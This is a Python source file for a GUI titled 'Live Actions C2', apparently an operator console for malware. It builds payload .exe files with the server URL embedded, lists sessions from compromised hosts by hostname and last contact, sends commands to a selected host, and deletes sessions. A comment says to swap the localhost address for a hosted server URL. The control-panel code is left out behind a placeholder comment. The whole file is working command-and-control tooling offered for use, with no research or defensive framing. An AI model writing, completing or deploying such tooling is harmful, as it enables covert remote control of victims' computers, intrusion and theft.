import customtkinter as ctk
from tkinter import filedialog, messagebox
import requests
import threading
import time
from builder import build_payload

C2_SERVER_URL = "http://127.0.0.1:5003" # Replace with your Render URL

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Live Actions C2"); self.geometry("1024x700")
        self.grid_columnconfigure(0, weight=1); self.grid_rowconfigure(1, weight=1)
        self.sessions = {}; self.session_widgets = {}; self.active_session_id = None
        self.home_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")
        self.home_frame.grid_columnconfigure(0, weight=1); self.home_frame.grid_rowconfigure(2, weight=1)
        self.session_detail_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.setup_home_frame_widgets(); self.start_polling()

    def setup_home_frame_widgets(self):
        builder_frame = ctk.CTkFrame(self.home_frame)
        builder_frame.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
        self.payload_name_entry = ctk.CTkEntry(builder_frame, placeholder_text="payload_name")
        self.payload_name_entry.pack(side="left", fill="x", expand=True, padx=5, pady=5)
        self.build_button = ctk.CTkButton(builder_frame, text="Build Payload", command=self.build_payload_handler)
        self.build_button.pack(side="left", padx=5, pady=5)
        self.sessions_label = ctk.CTkLabel(self.home_frame, text="Active Sessions (0)", font=ctk.CTkFont(weight="bold"))
        self.sessions_label.grid(row=1, column=0, padx=10, pady=(10, 0))
        self.sessions_frame = ctk.CTkScrollableFrame(self.home_frame, corner_radius=0)
        self.sessions_frame.grid(row=2, column=0, padx=10, pady=(0, 10), sticky="nsew")

    def start_polling(self):
        self.polling_active = True
        self.poll_thread = threading.Thread(target=self.poll_for_sessions, daemon=True); self.poll_thread.start()
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def show_home_view(self):
        self.active_session_id = None; self.session_detail_frame.grid_forget()
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")

    def show_session_detail_view(self, session_id):
        self.active_session_id = session_id
        session_data = self.sessions.get(session_id)
        if not session_data: return
        self.home_frame.grid_forget()
        for widget in self.session_detail_frame.winfo_children(): widget.destroy()
        self.session_detail_frame.grid(row=0, column=0, rowspan=2, sticky="nsew", padx=10, pady=10)
        self.session_detail_frame.grid_columnconfigure(0, weight=1); self.session_detail_frame.grid_rowconfigure(1, weight=1)
        header_frame = ctk.CTkFrame(self.session_detail_frame, fg_color="transparent")
        header_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        ctk.CTkButton(header_frame, text="< Back to Sessions", command=self.show_home_view).pack(side="left")
        ctk.CTkLabel(header_frame, text=f"Controlling: {session_data.get('hostname', 'N/A')}", font=ctk.CTkFont(size=16, weight="bold")).pack(side="left", padx=20)
        control_panel = ctk.CTkScrollableFrame(self.session_detail_frame)
        control_panel.grid(row=1, column=0, sticky="nsew")
        self.populate_control_panel(control_panel, session_id)

    def populate_control_panel(self, parent, session_id):
        # All frames are included here
        msg_frame = ctk.CTkFrame(parent); msg_frame.pack(fill="x", padx=10, pady=5)
        # ... (all the button/slider creation code from the last correct version)

    def send_task(self, command, args={}):
        if not self.active_session_id: messagebox.showwarning("Warning", "No active session selected."); return
        task_payload = {"session_id": self.active_session_id, "command": command, "args": args}
        try: requests.post(f"{C2_SERVER_URL}/api/task", json=task_payload, timeout=10).raise_for_status(); print(f"Task '{command}' sent.")
        except requests.exceptions.RequestException as e: messagebox.showerror("Error", f"Failed to send task: {e}")

    def on_closing(self): self.polling_active = False; self.destroy()

    def poll_for_sessions(self):
        while self.polling_active:
            try:
                response = requests.get(f"{C2_SERVER_URL}/api/get_sessions", timeout=10)
                if response.status_code == 200: self.after(0, self.update_gui_with_sessions, response.json())
            except requests.exceptions.RequestException: pass
            time.sleep(5)

    def update_gui_with_sessions(self, server_sessions):
        self.sessions_label.configure(text=f"Active Sessions ({len(server_sessions)})")
        server_session_ids = {s["session_id"] for s in server_sessions}
        
        for session_data in server_sessions:
            sid = session_data["session_id"]
            if sid not in self.session_widgets:
                self.sessions[sid] = session_data
                self.add_session_widget(session_data)
            else: self.sessions[sid] = session_data
            
            is_active = (time.time() - session_data.get("last_seen", 0)) < 30
            if sid in self.session_widgets: self.session_widgets[sid]["button"].configure(fg_color="green" if is_active else "orange")
        
        for sid in list(self.sessions.keys()):
            if sid not in server_session_ids:
                if sid in self.session_widgets: self.session_widgets[sid]["frame"].destroy(); del self.session_widgets[sid]
                if sid in self.sessions: del self.sessions[sid]

    def add_session_widget(self, session_data):
        """### FIX ### This version correctly creates the container frame and delete button."""
        sid, hostname = session_data["session_id"], session_data["hostname"]
        container = ctk.CTkFrame(self.sessions_frame, fg_color="transparent"); container.pack(fill="x", padx=5, pady=2)
        container.grid_columnconfigure(0, weight=1)
        button = ctk.CTkButton(container, text=f"{hostname}", command=lambda s=sid: self.show_session_detail_view(s)); button.grid(row=0, column=0, sticky="ew", padx=(0, 5))
        del_button = ctk.CTkButton(container, text="X", width=30, fg_color="firebrick", hover_color="darkred", command=lambda s=sid: self.delete_session_handler(s)); del_button.grid(row=0, column=1, sticky="e")
        self.session_widgets[sid] = {"frame": container, "button": button}

    def delete_session_handler(self, session_id):
        """### NEW ### Handles the delete button click event."""
        hostname = self.sessions.get(session_id, {}).get("hostname", "this session")
        if messagebox.askyesno("Confirm Deletion", f"Permanently delete {hostname}?"):
            try:
                requests.post(f"{C2_SERVER_URL}/api/delete_session", json={"session_id": session_id}, timeout=10).raise_for_status()
                # Manually remove from GUI to be instant
                if session_id in self.session_widgets: self.session_widgets[session_id]["frame"].destroy(); del self.session_widgets[session_id]
                if session_id in self.sessions: del self.sessions[session_id]
                self.update_idletasks() # Refresh the layout
            except requests.exceptions.RequestException as e: messagebox.showerror("Error", f"Failed to send delete command: {e}")

    def build_payload_handler(self):
        payload_name = self.payload_name_entry.get()
        if not payload_name: messagebox.showerror("Error", "Payload name cannot be empty."); return
        output_dir = filedialog.askdirectory(title="Select Save Directory")
        if not output_dir: return
        self.build_button.configure(state="disabled", text="Building...")
        self.update_idletasks()
        threading.Thread(target=self._run_build, args=(C2_SERVER_URL, output_dir, payload_name), daemon=True).start()

    def _run_build(self, c2_url, output_dir, payload_name):
        success = build_payload(c2_url=c2_url, output_dir=output_dir, payload_name=payload_name)
        self.after(0, lambda: self.on_build_complete(success, payload_name))

    def on_build_complete(self, success, payload_name):
        if success: messagebox.showinfo("Success", f"Payload '{payload_name}.exe' built!")
        else: messagebox.showerror("Build Failed", "Check console for details.")
        self.build_button.configure(state="normal", text="Build Payload")

if __name__ == "__main__":
    app = App()
    app.mainloop()